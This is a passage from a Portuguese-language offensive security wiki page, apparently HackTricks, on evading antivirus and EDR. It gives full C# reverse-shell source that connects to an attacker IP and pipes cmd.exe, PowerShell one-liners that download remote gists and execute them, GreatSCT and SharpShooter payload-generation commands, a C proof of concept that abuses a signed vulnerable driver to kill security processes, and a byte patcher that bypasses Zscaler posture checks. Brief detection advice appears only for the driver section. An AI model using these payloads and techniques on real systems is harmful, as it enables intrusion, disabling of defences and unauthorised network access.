cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Dentro do GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Agora **inicie o lister** com `msfconsole -r file.rc` e **execute** o **payload xml** com:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**O defensor atual encerrará o processo muito rapidamente.**

### Compilando nosso próprio reverse shell

https://medium.com/@Bank\_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Primeiro Revershell em C#

Compile-o com:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Use-o com:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# usando compilador
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Download e execução automáticos:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Lista de ofuscadores C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Usando python para construir exemplos de injetores:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Outras ferramentas
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Mais

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Traga Seu Próprio Driver Vulnerável (BYOVD) – Eliminando AV/EDR do Espaço do Kernel

Storm-2603 aproveitou uma pequena utilidade de console conhecida como **Antivirus Terminator** para desativar as proteções de endpoint antes de implantar ransomware. A ferramenta traz seu **próprio driver vulnerável, mas *assinado*** e o abusa para emitir operações privilegiadas do kernel que até mesmo os serviços AV Protected-Process-Light (PPL) não conseguem bloquear.

Principais conclusões
1. **Driver assinado**: O arquivo entregue ao disco é `ServiceMouse.sys`, mas o binário é o driver legitimamente assinado `AToolsKrnl64.sys` do “System In-Depth Analysis Toolkit” da Antiy Labs. Como o driver possui uma assinatura válida da Microsoft, ele carrega mesmo quando a Driver-Signature-Enforcement (DSE) está habilitada.
2. **Instalação do serviço**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
A primeira linha registra o driver como um **serviço de kernel** e a segunda o inicia para que `\\.\ServiceMouse` se torne acessível a partir do espaço do usuário.
3. **IOCTLs expostos pelo driver**
| Código IOCTL | Capacidade                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Terminar um processo arbitrário por PID (usado para matar serviços do Defender/EDR) |
| `0x990000D0` | Deletar um arquivo arbitrário no disco |
| `0x990001D0` | Descarregar o driver e remover o serviço |

Prova de conceito mínima em C:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Por que funciona**: O BYOVD ignora completamente as proteções do modo usuário; o código que é executado no kernel pode abrir processos *protegidos*, terminá-los ou manipular objetos do kernel independentemente de PPL/PP, ELAM ou outras características de endurecimento.

Detecção / Mitigação
•  Ative a lista de bloqueio de drivers vulneráveis da Microsoft (`HVCI`, `Smart App Control`) para que o Windows se recuse a carregar `AToolsKrnl64.sys`.
•  Monitore a criação de novos serviços *de kernel* e alerte quando um driver for carregado de um diretório gravável por todos ou não estiver presente na lista de permissões.
•  Fique atento a handles do modo usuário para objetos de dispositivo personalizados seguidos por chamadas suspeitas de `DeviceIoControl`.

### Contornando Verificações de Postura do Zscaler Client Connector via Patch de Binário em Disco

O **Client Connector** da Zscaler aplica regras de postura de dispositivo localmente e depende do RPC do Windows para comunicar os resultados a outros componentes. Duas escolhas de design fracas tornam um contorno completo possível:

1. A avaliação de postura acontece **totalmente do lado do cliente** (um booleano é enviado ao servidor).
2. Os endpoints RPC internos apenas validam se o executável conectado é **assinado pela Zscaler** (via `WinVerifyTrust`).

Ao **patchar quatro binários assinados em disco**, ambos os mecanismos podem ser neutralizados:

| Binário | Lógica original patchada | Resultado |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Sempre retorna `1`, então cada verificação é compatível |
| `ZSAService.exe` | Chamada indireta para `WinVerifyTrust` | NOP-ed ⇒ qualquer processo (mesmo não assinado) pode se conectar aos pipes RPC |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Substituído por `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Verificações de integridade no túnel | Curto-circuitado |

Trecho do patcher mínimo:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Após substituir os arquivos originais e reiniciar a pilha de serviços:

* **Todos** os cheques de postura exibem **verde/compatível**.
* Binários não assinados ou modificados podem abrir os pontos finais de RPC de named-pipe (por exemplo, `\\RPC Control\\ZSATrayManager_talk_to_me`).
* O host comprometido ganha acesso irrestrito à rede interna definida pelas políticas do Zscaler.

Este estudo de caso demonstra como decisões de confiança puramente do lado do cliente e verificações de assinatura simples podem ser derrotadas com alguns patches de byte.

## Referências

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)

{{#include ../banners/hacktricks-training.md}}
